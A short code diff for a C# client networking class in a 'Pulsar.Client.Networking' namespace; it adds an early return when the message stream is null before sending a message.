@@ -367,6 +367,11 @@ namespace Pulsar.Client.Networking
         /// <param name="message">The message to send.</param>
         private void SafeSendMessage(IMessage message)
         {
+            if (_stream == null)
+            {
+                return;
+            }
+
             try
             {
                 lock (_sendMessageLock)
